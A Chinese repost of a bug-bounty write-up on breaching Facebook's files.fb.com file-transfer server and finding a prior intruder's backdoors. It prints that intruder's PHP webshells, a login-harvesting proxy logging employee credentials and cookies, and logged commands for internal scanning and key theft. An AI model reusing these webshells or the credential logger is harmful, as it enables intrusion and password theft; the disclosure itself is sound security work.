<p>一般来说大公司在渗透中比较容易出现的问题点这里举几个例子来探讨</p>  <ol>   <li>对多数大公司而言，&quot;<b>网络边界</b>”是比较难顾及、容易出现问题的一块，当公司规模越大，同时拥有数千、数万台机器在线，网管很难顾及到每台机器。在攻防里，防守要防的是一个面，但攻击只需 找个一个点就可以突破，所以防守方相对处于弱势，攻击者只要找到一台位于网络边界的机器入侵进去就可以开始在内网进行渗透了!</li>    <li>对于 “<b>连网设备</b>” 的安全意识相对薄弱，由于连网设备通常不会提供 SHELL 给管理员做进一步的操作，只能由设备本身所提供的接口设定，所以通常对于设备的防御都是从网络层来抵挡，但如遇到设备本身的 0-Day 或者是 1-Day 可能连被入侵了都不自觉。</li>    <li>人的安全，随着 “<a href="http://ha.cker.in/tag/社工库" target="_blank">社工库</a><b></b>” 的崛起，有时可以让一次渗透的流程变得异常简单，从公开数据找出公司员工列表，再从社工库找到可以登入 VPN 的员工密码就可以开始进行内网渗透，尤其当社工库数量越来越多 “<b>量变成质变</b>” 时只要关键人物的密码在社工库中可找到，那企业的安全性就全然突破。</li> </ol>  <p>理所当然在寻找 <a href="http://ha.cker.in/tag/Facebook" target="_blank">Facebook</a> 弱点时会以平常进行渗透的思路进行，在开始搜集数据时除了针对 Facebook 本身域名查询外也对注册信箱进行 Reverse Whois 意外发现了个奇妙的域名名称</p><br><a id="more"></a><br><p><b>tfbnw</b>.net</p>  <p>TFBNW 似乎是 “<b>TheFacebook Network</b>”的缩写    <br>再藉由公开资料发现存在下面这台这台服务器</p>  <p><b>vpn</b>.tfbnw.net</p>  <p>哇! vpn.tfbnw.net 看起来是个 Juniper <a href="http://ha.cker.in/tag/SSL VPN" target="_blank">SSL VPN</a> 的登入接口，不过版本满新的没有直接可利用的弱点，不过这也成为了进入后面故事的开端。</p>  <p>TFBNW 看似是 <a href="http://ha.cker.in/tag/Facebook" target="_blank">Facebook</a> 内部用的域名，来扫扫 vpn.tfbnw.net 同网段看会有什么发现</p>  <ul>   <li>Mail Server Outlook Web App</li>    <li>F5 BIGIP SSL VPN</li>    <li>CISCO ASA SSL VPN</li>    <li>Oracle E-Business</li>    <li>MobileIron MDM</li> </ul>  <p>从这几台机器大致可以判断这个网段对于 Facebook 来说应该是相对重要的网段，之后一切的故事就从这里开始。</p>  <p><b>弱点发现</b></p>  <p>在同网段中，发现一台特别的服务器</p>  <p><b>files</b>.fb.com</p>  <p><i><a href="http://image.3001.net/images/20160425/14615710669457.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Facebook_D5C9/clip_image002.jpg" width="694" height="376"></a></i></p>  <p><i>files.fb.com </i><i>登入界面</i></p>  <p>从 LOGO 以及 Footer 判断应该是 Accellion 的 Secure File Transfer (以下简称 FTA)</p>  <p>FTA 为一款标榜安全文件传输的产品，可让用户在线分享、同步档案，并整合 AD, LDAP, Kerberos 等 Single Sign-on 机制，Enterprise 版本更支持 SSL VPN 服务。</p>  <p>首先看到 FTA 的第一件事是去网络上搜寻是否有公开的 Exploit 可以利用，Exploit 最近的是由 HD Moore 发现并发布在 Rapid7 的这篇 Advisory</p>  <ul>   <li><a href="https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857" target="_blank" rel="external">Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)</a></li> </ul>  <p>弱点中可直接从 “<b>/tws/getStatus</b>” 中泄漏的版本信息判断是否可利用，在发现 files.fb.com 时版本已从有漏洞的 0.18 升级至 0.20 了，不过就从 Advisory 中所透露的片段程序代码感觉 FTA 的撰写风格如果再继续挖掘可能还是会有问题存在的，所以这时的策略便开始往寻找 FTA 产品的 0-Day 前进!</p>  <p>不过从实际黑箱的方式其实找不出什么问题点只好想办法将方向转为白箱测试，透过各种方式拿到旧版的 FTA 原始码后终于可以开始研究了!</p>  <p>整个 FTA 产品大致架构：</p>  <p>网页端接口主要由 Perl 以及 PHP 构成</p>  <p>PHP 原始码皆经过 IonCube 加密</p>  <p>在背景跑了许多 Perl 的 Daemon</p>  <p>首先是解密 IonCude 的部分，许多设备为了防止自己的产品被检视所以会将原始码加密，不过好在 FTA 上的 IonCude 版本没到最新，可以使用现成的工具解密，不过由于 PHP 版本的问题，细节部份以及数值运算等可能要靠自己修复一下，不然有点难看…</p>  <p>经过简单的原始码审查后发现，好找的弱点应该都被 Rapid7 找走了 T^T   <br>而需要认证才能触发的漏洞又不怎么好用，只好认真点往深层一点的地方挖掘!</p>  <p>经过几天的认真挖掘，最后总共发现了七个弱点，其中包含了</p>  <p>Cross-Site Scripting x 3</p>  <p>Pre-Auth SQL Injection leads to Remote Code Execution</p>  <p>Known-Secret-Key leads to Remote Code Execution</p>  <p>Local Privilege Escalation x 2</p>  <p>除了回报 Facebook 安全团队外，其余的弱点也制作成 Advisory 提交 Accellion 技术窗口，经过厂商修补提交 CERT/CC 后取得四个 CVE 编号：</p>  <p>CVE-2016-2350</p>  <p>CVE-2016-2351</p>  <p>CVE-2016-2352</p>  <p>CVE-2016-2353</p>  <p>详细的弱点细节会待 Full Disclosure Policy 后公布!</p>  <p><a href="http://image.3001.net/images/20160425/14615712074623.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/Facebook_D5C9/clip_image003.jpg" width="694" height="415"></a></p>  <p>使用 Pre-Auth SQL Injection 写入 Webshell</p>  <p>在实际渗透中进去服务器后的第一件事情就是检视当前的环境是否对自己人善，为了要让自己可以在服务器上待的久就要尽可能的了解服务器上有何限制、纪录，避开可能会被发现的风险 </p>  <p>Facebook 大致有以下限制：</p>  <p>防火墙无法连外, TCP, UDP, 53, 80, 443 皆无法</p>  <p>存在远程的 Syslog 服务器</p>  <p>开启 <a href="http://ha.cker.in/tag/Auditd" target="_blank">Auditd</a> 记录</p>  <p>无法外连看起来有点麻烦，但是 ICMP Tunnel 看似是可行的，但这只是一个 Bug Bounty Program 其实不需要太麻烦就纯粹以 <a href="http://ha.cker.in/tag/WebShell" target="_blank">Webshell</a> 操作即可。</p>  <p><b>似乎有点奇怪?</b></p>  <p>正当收集证据准备回报 Facebook 安全团队时，从网页日志中似乎看到一些奇怪的痕迹。</p>  <p>首先是在 “<b>/var/opt/apache/php_error_log</b>” 中看到一些奇怪的 PHP 错误讯息，从错误讯息来看似乎像是边改 Code 边执行所产生的错误?</p>  <p><a href="http://image.3001.net/images/20160425/1461571392935.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/Facebook_D5C9/clip_image004.jpg" width="694" height="376"></a></p>  <p><i> PHP error log</i></p>  <p>跟随错误讯息的路径去看发现疑似前人留下的 Webshell 后门</p>  <p><a href="http://image.3001.net/images/20160425/14615714539437.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/Facebook_D5C9/clip_image005.jpg" width="694" height="534"></a></p>  <p><i>Webshell on facebook server</i></p>  <p>其中几个档案的内容如下</p>  <p><b>sshpass</b></p>  <p>没错，就是那个 <a href="http://linux.die.net/man/1/sshpass" target="_blank" rel="external">sshpass</a></p>  <p><b>bN3d10Aw.php</b></p>  <p>&lt;?phpecho shell_exec($_GET[‘c’]); ?&gt;</p>  <p><b>uploader.php</b></p>  <p>&lt;?phpmove_uploaded_file($_FILES[&quot;f][&quot;tmp_name&quot;], basename($_FILES[&quot;f&quot;][&quot;name&quot;]));?&gt;</p>  <p><b>d.php</b></p>  <p>&lt;?phpinclude_oncce(&quot;/home/seos/courier/remote.inc&quot;); echo decrypt($_GET[&quot;c&quot;]);?&gt;</p>  <p><b>sclient_user_class_standard.inc</b></p>  <p>&lt;?php</p>  <p>include_once(‘sclient_user_class_standard.inc.orig’);</p>  <p>$fp= fopen(&quot;/home/seos/courier/B3dKe9sQaa0L.log&quot;, &quot;a&quot;); </p>  <p>$retries= 0;</p>  <p>$max_retries= 100; </p>  <p>//省略…</p>  <p>fwrite($fp,date(&quot;Y-m-d H:i:s T&quot;) . &quot;;&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]. &quot;;&quot; . $_SERVER[&quot;HTTP_USER_AGENT&quot;] . &quot;;POST=&quot; . http_build_query($_POST). &quot;;GET=&quot; . http_build_query($_GET) . &quot;;COOKIE=&quot; . http_build_query($_COOKIE). &quot;\n&quot;); </p>  <p>//省略…</p>  <p>前几个就是很标准的 PHP 一句话木马   <br>其中比较特别的是 “<b>sclient_user_class_standard.inc</b>” 这个档案</p>  <p>include_once 中 “<b>sclient_user_class_standard.inc.orig</b>”为原本对密码进行验证的 PHP 程序，黑客做了一个 Proxy 在中间并在进行一些重要操作时先把 GET, POST, COOKIE 的值记录起来</p>  <p>整理一下，黑客做了一个 Proxy 在密码验证的地方，并且记录 Facebook 员工的账号密码，并且将记录到的密码放置在 Web 目录下，黑客每隔一段时间使用 wget 抓取</p>  <p>wget<a href="https://files.fb.com/courier/B3dKe9sQaa0L.log" target="_blank" rel="external">https://files.fb.com/courier/B3dKe9sQaa0L.log</a></p>  <p><a href="http://image.3001.net/images/20160425/14615715182217.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/Facebook_D5C9/clip_image006.jpg" width="653" height="92"></a></p>  <p>↑ Logged passwords</p>  <p>从纪录里面可以看到除了用户账号密码外，还有从 FTA 要求档案时的信件内容，记录到的账号密码会定时 Rotate (后文会提及，这点还满机车的XD)</p>  <p>发现当下，最近一次的 Rotate 从 2/1 记录到 2/7 共约 300 笔账号密码纪录，大多都是 “<b>@fb.com</b>” 或是 “<b>@facebook.com</b>” 的员工帐密，看到当下觉得事情有点严重了，在 FTA 中，使用者的登入主要有两种模式</p>  <ol>   <li>一般用户注册，密码 Hash 存在数据库，由 SHA256 + SALT 储存</li>    <li>Facebook 员工 (@fb.com) 则走统一认证，使用 LDAP 由 AD 认证</li> </ol>  <p>在这里相信记录到的是真实的员工账号密码，<b><strong>猜测</strong></b> 这份账号密码应该可以通行 Facebook Mail OWA, VPN 等服务做更进一步的渗透…</p>  <p>此外，这名 “黑客” 可能习惯不太好</p>  <ol>   <li>后门参数皆使用 GET 来传递，在网页日志可以很明显的发现他的足迹</li>    <li>黑客在进行一些指令操作时没顾虑到 STDERR ，导致网页日志中很多指令的错误讯息，从中可以观察黑客做了哪些操作</li> </ol>  <p>从 access.log 可以观察到的每隔数日黑客会将记录到的账号密码清空</p>  <p>1cattmp_list3_2 | <b>while</b> <b>read</b> line; <b>do</b> cp /home/filex2/1000/$line files; done2&gt;/dev/stdout92.168.54.13- - 17955 [Sat, 23 Jan 2016 19:04:10 +0000 | 1453575850] &quot;GET/courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p ‘<strong><em>**</em></strong>‘ ssh -v -oStrictHostKeyChecking=no soggycat@localhost ‘cp/home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo&gt; /home/seos/courier/B3dKe9sQaa0L.log’ 2&gt;/dev/stdout HTTP/1.1&quot; 200 2559…</p>  <p> cattmp_list3_2 | <b>while</b> read line; <b>do</b> cp /home/filex2/1000/$line files; <b>done</b>2&gt;/dev/stdout</p>  <p><b>tar-czvf</b> <b>files</b>.tar.gz <b>files</b></p>  <p>打包档案</p>  <p>对内部网络结构进行探测</p>  <p><b>diga</b> archibus.thefacebook.com</p>  <p>telnetarchibus.facebook.com 80</p>  <p>curl<a href="http://archibus.thefacebook.com/spaceview_facebook/locator/room.php" target="_blank" rel="external">http://archibus.thefacebook.com/spaceview_facebook/locator/room.php</a></p>  <p>diga records.fb.com</p>  <p>telnetrecords.fb.com 80</p>  <p>telnetrecords.fb.com 443</p>  <p>wget-O- -q <a href="http://192.168.41.16" target="_blank" rel="external">http://192.168.41.16</a></p>  <p>diga acme.facebook.com</p>  <p>./sshpass-p ‘<strong><em>**</em></strong>‘ ssh -v -o StrictHostKeyChecking=no soggycat@localhost ‘for i in $(seq201 1 255); do for j in $(seq 0 1 255); do echo &quot;192.168.$i.$j:<code>dig +shortptr $j.$i.168.192.in-addr.arpa</code>&quot;; done; done’ 2&gt;/dev/stdout</p>  <p>…</p>  <p>使用 Shell Script 进行内网扫描但忘记把 STDERR 导掉XD</p>  <p><a href="http://image.3001.net/images/20160425/14615716777793.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/Facebook_D5C9/clip_image007.jpg" width="694" height="376"></a></p>  <p>尝试对内部 <a href="http://ha.cker.in/tag/LDAP" target="_blank">LDAP</a> 进行连接</p>  <p>sh:-c: line 0: syntax error near unexpected token <code>(&#39;&lt;/p&gt;  &lt;p&gt;sh:-c: line 0:</code>ldapsearch -v -x -H ldaps://ldap.thefacebook.com -bCN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w ‘<b><strong>*</strong></b><i><em>**</em></i>‘ -sbase (objectclass=) 2&gt;/dev/stdout’</p>  <p>尝试访问内部网络资源   <br>( 看起来 Mail OWA 可以直接访问 …)</p>  <p>–20:38:09–&#160; <a href="https://mail.thefacebook.com/" target="_blank" rel="external">https://mail.thefacebook.com/</a></p>  <p>Resolvingmail.thefacebook.com… 192.168.52.37</p>  <p>Connectingto mail.thefacebook.com|192.168.52.37|:443… connected.</p>  <p>HTTPrequest sent, awaiting response… 302 Found</p>  <p>Location:<a href="https://mail.thefacebook.com/owa/" target="_blank" rel="external">https://mail.thefacebook.com/owa/</a> [following]</p>  <p>–20:38:10–&#160; <a href="https://mail.thefacebook.com/owa/" target="_blank" rel="external">https://mail.thefacebook.com/owa/</a></p>  <p>Reusingexisting connection to mail.thefacebook.com:443.</p>  <p>HTTPrequest sent, awaiting response… 302 Moved Temporarily</p>  <p>Location:<a href="https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0[following" target="_blank" rel="external">https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0[following</a>]</p>  <p>–20:38:10– <a href="https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0" target="_blank" rel="external">https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;reason=0</a></p>  <p>Reusingexisting connection to mail.thefacebook.com:443.</p>  <p>HTTPrequest sent, awaiting response… 200 OK</p>  <p>Length:8902 (8.7K) [text/html]</p>  <p>Savingto: <code>STDOUT&#39;&lt;/p&gt;  &lt;p&gt;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 0K ........&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 100% 1.17G=0s&lt;/p&gt;  &lt;p&gt;20:38:10(1.17 GB/s) -</code>-‘ saved [8902/8902]</p>  <p>–20:38:33–&#160; (try:15) <a href="https://10.8.151.47/" target="_blank" rel="external">https://10.8.151.47/</a></p>  <p>Connectingto 10.8.151.47:443… –20:38:51– <a href="https://svn.thefacebook.com/" target="_blank" rel="external">https://svn.thefacebook.com/</a></p>  <p>Resolvingsvn.thefacebook.com… failed: Name or service not known.</p>  <p>–20:39:03–&#160; <a href="https://sb-dev.thefacebook.com/" target="_blank" rel="external">https://sb-dev.thefacebook.com/</a></p>  <p>Resolvingsb-dev.thefacebook.com… failed: Name or service not known.</p>  <p>failed:Connection timed out.</p>  <p>Retrying.</p>  <p>尝试对 SSL Private Key 下手</p>  <p>sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied</p>  <p>ls:/etc/opt/apache/ssl.key/server.key: No such file <b>or</b> directory</p>  <p>mv:cannot <b>stat</b> <code>x&#39;: No such file or directory&lt;/p&gt;  &lt;p&gt;sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied&lt;/p&gt;  &lt;p&gt;mv:cannot stat</code><b>x</b>‘: No such file or directory</p>  <p>sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied</p>  <p>mv:cannot stat <code>x&#39;: No such file &lt;b&gt;or&lt;/b&gt; directory&lt;/p&gt;  &lt;p&gt;sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied&lt;/p&gt;  &lt;p&gt;mv:cannot &lt;b&gt;stat&lt;/b&gt;</code>x’: No such file or directory</p>  <p>sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied</p>  <p>mv:cannot stat `<b>x</b>‘: No such file or directory</p>  <p>sh:/etc/opt/apache/ssl.crt/server.crt: Permission denied</p>  <p>base64:invalid input</p>  <p><a href="http://image.3001.net/images/20160425/14615717098042.jpg" target="_blank" rel="external"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/Facebook_D5C9/clip_image008.jpg" width="568" height="515"></a></p>  <p>从浏览器观察 files.fb.com 的凭证还是 Wildcard 的 *.fb.com …</p>  <p><b>后记</b></p>  <p>在收集完足够证据后便立即回报给 Facebook 安全团队，回报内容除了漏洞细节外，还附上相对应的 Log 、截图以及时间纪录xD</p>  <p>从服务器中的日志可以发现有两个时间点是明显黑客在操作系统的时间，一个是七月初、另个是九月中旬</p>  <p>七月初的动作从纪录中来看起来比较偏向 “逛” 服务器，但九月中旬的操作就比较恶意了，除了逛街外，还放置了密码 Logger 等，至于两个时间点的 “黑客” 是不是同一个人就不得而知了    <br>而七月发生的时机点正好接近 CVE-2015-2857 Exploit 公布前，究竟是透过 1-Day 还是无 0-Day 入侵系统也无从得知了。</p>  <p>这件事情就记录到这里，总体来说这是一个非常有趣的经历xD   <br>也让我有这个机会可以来写写关于渗透的一些文章 </p>  <p>最后也感谢 Bug Bounty 及胸襟宽阔的 Facebook 安全团队 让我可以完整记录这起事件 : )</p>  <p><b>Timeline</b></p>  <ul>   <li>2016/02/05 20:05 提供漏洞详情给 Facebook 安全团队</li>    <li>2016/02/05 20:08 收到机器人自动回复</li>    <li>2016/02/06 05:21 提供弱点 Advisory 给 Accellion 技术窗口</li>    <li>2016/02/06 07:42 收到 Thomas 的回复，告知调查中</li>    <li>2016/02/13 07:43 收到 Reginaldo 的回复，告知 Bug Bounty 奖金 $10000 USD</li>    <li>2016/02/13 询问是否撰写 Blog 是否有任何要注意的地方?</li>    <li>2016/02/13 询问此漏洞被认为是 RCE 还是 SQL Injection</li>    <li>2016/02/18 收到 Reginaldo 的回复，告知正在进行调查中，希望 Blog 先暂时不要发出</li>    <li>2016/02/24 收到 Hai 的回复，告知奖金将会于三月发送</li>    <li>2016/04/20 收到 Reginaldo 的回复，告知调查已完成</li> </ul>  <p>刚好最近有一篇Hacking Team渗透过程说明，两个渗透过程可以搭配着看</p>  <p>全文轉自：<a href="http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/" target="_blank" rel="external">http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/</a></p>
-    </section>
-    <footer class="post-footer">
-      <section class="author">
-    <h4>Secer</h4>
-    <p>记录互联网安全历程与个人成长经历</p>
-</section>
-      <section class="share">
-    <h4>Share this post</h4>
-    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1138.seo/" target="_blank">
-        <span class="hidden">weibo</span>
-    </a>
-    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1138.seo/"
-       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-        <span class="hidden">Twitter</span>
-    </a>
-    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1138.seo/"
-       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
-        <span class="hidden">Facebook</span>
-    </a>
-    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1138.seo/"
-       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
-        <span class="hidden">Google+</span>
-    </a>
-</section>
-
-    </footer>
-  </article>
-  <nav class="pagination" role="pagination">
-    
-    <a class="newer-posts" href="/1140.seo/">
-        ← 为什么这么多创业公司都在做 蜜罐 ？也许这篇文章能告诉你
-    </a>
-    
-    <span class="icon-logo">•</span>
-    
-    <a class="older-posts" href="/1137.seo/">
-        渗透Hacking Team过程 →
-    </a>
-    
-</nav>
-
-  <div id="comment" class="comments-area">
-    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
-    
-</div>
-
-</main>
-
-
-      
-<footer class="site-footer">
   
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
-  </div>
-</footer>
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
-
-
-
-  </div>
 </div>
 
-<nav  class="outer-nav top horizontal">
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/category/渗透测试/">渗透测试</a>
+</div>
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+  <div class="article-tags">
+  
+  <span></span> <a href="/tag/渗透测试/">渗透测试</a><a href="/tag/Facebook/">Facebook</a><a href="/tag/社工库/">社工库</a><a href="/tag/SSL-VPN/">SSL VPN</a><a href="/tag/Auditd/">Auditd</a>
+  </div>
 
-          <a class="icon-image"  href="/images"><span>Images</span></a>
 
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/1140.seo/" title="为什么这么多创业公司都在做 蜜罐 ？也许这篇文章能告诉你">
+  <strong>Prev:</strong><br/>
+  <span>
+  为什么这么多创业公司都在做 蜜罐 ？也许这篇文章能告诉你</span>
+</a>
+</div>
 
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
 
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+<div class="next">
+<a href="/1137.seo/"  title="渗透Hacking Team过程">
+ <strong>Next:</strong><br/> 
+ <span>渗透Hacking Team过程
+</span>
+</a>
+</div>
 
 </nav>
 
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-渗透Facebook的思路与发现" data-title="渗透Facebook的思路与发现" data-url="http://ha.cker.in/1138.seo/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+<iframe width="100%" height="120" class="share_self" marginheight="5px" frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=120&fansRow=2&ptype=1&speed=0&skin=1&isTitle=1&noborder=1&isWeibo=1&isFans=1&uid=2583230784&verifier=1d07a1a0&dpc=1"></iframe>
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/category/Linux笔记/" title="Linux笔记">Linux笔记<sup>46</sup></a></li>
+		
+			<li><a href="/category/Web安全/" title="Web安全">Web安全<sup>88</sup></a></li>
+		
+			<li><a href="/category/代码学习/" title="代码学习">代码学习<sup>25</sup></a></li>
+		
+			<li><a href="/category/原创文章/" title="原创文章">原创文章<sup>37</sup></a></li>
+		
+			<li><a href="/category/工具视频/" title="工具视频">工具视频<sup>12</sup></a></li>
+		
+			<li><a href="/category/影音娱乐/" title="影音娱乐">影音娱乐<sup>15</sup></a></li>
+		
+			<li><a href="/category/手机安全/" title="手机安全">手机安全<sup>11</sup></a></li>
+		
+			<li><a href="/category/无线安全/" title="无线安全">无线安全<sup>4</sup></a></li>
+		
+			<li><a href="/category/渗透测试/" title="渗透测试">渗透测试<sup>94</sup></a></li>
+		
+			<li><a href="/category/疑难杂症/" title="疑难杂症">疑难杂症<sup>11</sup></a></li>
+		
+			<li><a href="/category/精品软件/" title="精品软件">精品软件<sup>16</sup></a></li>
+		
+			<li><a href="/category/絮叨碎语/" title="絮叨碎语">絮叨碎语<sup>47</sup></a></li>
+		
+			<li><a href="/category/黑客技巧/" title="黑客技巧">黑客技巧<sup>77</sup></a></li>
+		
+		</ul>
 </div>
-</body>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tag/net/" title=".net">.net<sup>1</sup></a></li>
+		
+			<li><a href="/tag/0day/" title="0day">0day<sup>5</sup></a></li>
+		
+			<li><a href="/tag/12306/" title="12306">12306<sup>3</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂/" title="12306刷票外挂">12306刷票外挂<sup>1</sup></a></li>
+		
+			<li><a href="/tag/12306刷票外挂下载/" title="12306刷票外挂下载">12306刷票外挂下载<sup>1</sup></a></li>
+		
+			<li><a href="/tag/1521/" title="1521">1521<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3389/" title="3389">3389<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360/" title="360">360<sup>1</sup></a></li>
+		
+			<li><a href="/tag/3600safe/" title="3600safe">3600safe<sup>1</sup></a></li>
+		
+			<li><a href="/tag/360浏览器抢票专版/" title="360浏览器抢票专版">360浏览器抢票专版<sup>1</sup></a></li>
+		
+			<li><a href="/tag/61398/" title="61398">61398<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ACL/" title="ACL">ACL<sup>1</sup></a></li>
+		
+			<li><a href="/tag/APT/" title="APT">APT<sup>3</sup></a></li>
+		
+			<li><a href="/tag/ARP/" title="ARP">ARP<sup>2</sup></a></li>
+		
+			<li><a href="/tag/ASP/" title="ASP">ASP<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ASP中FSO的神奇功能/" title="ASP中FSO的神奇功能">ASP中FSO的神奇功能<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ATM/" title="ATM">ATM<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript中shellcode的定位和提取/" title="ActionScript中shellcode的定位和提取">ActionScript中shellcode的定位和提取<sup>1</sup></a></li>
+		
+			<li><a href="/tag/ActionScript的反汇编和反编译/" title="ActionScript的反汇编和反编译">ActionScript的反汇编和反编译<sup>1</sup></a></li>
+		
+			<li><a href="/tag/Acunetix-Web-Vulnerability-Scanner/" title="Acunetix Web Vulnerability Scanner">Acunetix Web Vulnerability Scanner<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/dreajay" target="_blank" title="dreajay csdn">CSDN</a></li>
+      <li><a href="https://github.com/dreajay" target="_blank" title="dreajay github">github</a></li>
+      <li><a href="http://www.douban.com/people/72514701/" target="_blank" title="dreajay豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
